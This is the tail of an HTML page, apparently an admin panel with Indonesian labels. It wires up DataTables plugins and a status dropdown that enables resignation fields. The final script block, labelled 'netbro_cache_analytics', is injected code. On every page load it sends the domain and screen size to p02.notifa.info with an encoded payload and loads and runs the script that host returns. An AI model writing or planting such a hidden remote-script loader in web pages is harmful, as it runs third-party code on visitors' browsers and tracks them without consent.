<script src="/assets/lib/datatables/plugins/buttons/js/dataTables.buttons.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/buttons.html5.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/buttons.flash.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/buttons.print.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/buttons.colVis.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/buttons.bootstrap.js" type="text/javascript"></script>

<script type="text/javascript">
    $(document).ready(function(){
        //initialize the javascript
        App.init();
        App.dataTables();
    });
</script>

<script>
$(document).ready(function(){
    $('[data-toggle="popover"]').popover();   
});
</script>

<script type="text/javascript">
    document.getElementById("status").onchange = function () {
        document.getElementById("alasan").setAttribute("disabled", "disabled");
        document.getElementById("tgl_resign").setAttribute("disabled", "disabled");
        if (this.value == 'Resign')
            document.getElementById("alasan").removeAttribute("disabled");
        if (this.value == 'Resign')
            document.getElementById("tgl_resign").removeAttribute("disabled");
    };

    // Fungsi Menu dashboard

    $(document).ready(function(){

        App.init();
        App.dashboard();

    });
</script>

<script type="text/javascript">
    if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function() {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) {
            fn();
        }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mrwd1XyoNwUzpvf2l56FucADiEx%2bf3JAPJogkNU%2biFfwCiZ%2bA5y%2fz1GPfkI78hOjpKGi13lyWOD4PTAvdGjGONrTkbHyQtyDiXMT6f73PUxXAafylPFQAofDmqSRGCN6kLPoPHF5oxuxg%2bsgcyENso77BDI%2biq12wLsMGa%2bin6lXObrjR5nN3n3mCHDOu9rOERnmtSCzsvQVvQC2um1T%2fNsq2QIjE4KBpR9Vkl2LpxVPpB5ls%2failQCaTL23yQg6%2fVmE4aJahv4ErgHCjfL9mX4EPIxsCfVSS1MVwUyVfrSegVjjaXYDrZcarSkz7F2VXD0r3sg%2bPtdKUwpPNNQOOz0e5p%2bJ9WrZ7lxjycaB2F9Ci38ljGYNDUDDsnXT6j2Y7m3PBs%2bu3Atlk%2f2VykRlaJnvFNX%2bS%2flT5eDv6PQdmrWoWEBnXUCINHwnSwu3Cu7NudtMWlNGrsWK93HbdfLL45H%2f2NwIlDGeGNFBHlAFq869dDf3eePYoKSnP2OLHCFol" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }
        netbro_cache_analytics(requestCfs, function() {});
    };

</script>

</body>
</html>
